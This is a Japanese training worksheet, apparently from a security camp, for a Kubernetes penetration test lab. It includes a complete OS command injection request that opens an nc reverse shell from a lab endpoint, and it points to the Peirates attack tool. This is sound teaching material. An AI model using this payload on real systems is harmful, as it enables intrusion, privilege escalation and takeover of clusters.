# 簡易ペネトレーションテスト

## 課題1: シナリオに沿った攻撃演習

アプリケーションには脆弱なエンドポイントがあります。脆弱性を利用してクラスタ内に侵入し、権限昇格や横展開を試してみましょう。

参考: [seccamp2024-B6 - 攻撃シナリオ](https://github.com/kyohmizu/seccamp2024-B6/blob/master/ch03_attacking_k8s/attack_scenario.md)

### ステップ
1. OSコマンドインジェクションでクラスタ内に侵入し、権限昇格や横展開を駆使してadmin権限を掌握します

<details><summary>初期侵入のリクエスト</summary>

`/api/admin/info` にOSコマンドインジェクションの脆弱性があります。

ターミナルを2画面用意し、リバースシェルを使って侵入します。

```bash
# ターミナル1
nc -l 4444

# ターミナル2
curl "https://app.seccamp.com/api/admin/info?info=nohup%20mkfifo%20/tmp/f%3B%20nc%20$(hostname -I | awk '{print $1}')%204444%20%3C%20/tmp/f%20%7C%20/bin/sh%20%3E%20/tmp/f%202%3E%261%3B%20rm%20/tmp/f%20%26"
```

</details>

## 課題2: Pirates を使用したペネトレーションテスト

Kubernetesペネトレーションテストツール「Pirates」を使用して、Kubernetesクラスタとコンテナ化されたアプリケーションのセキュリティ評価を実践的に学習します。

https://github.com/inguardians/peirates

### ステップ
1. Pirates をインストールし、利用可能なコマンドを検証してみてください
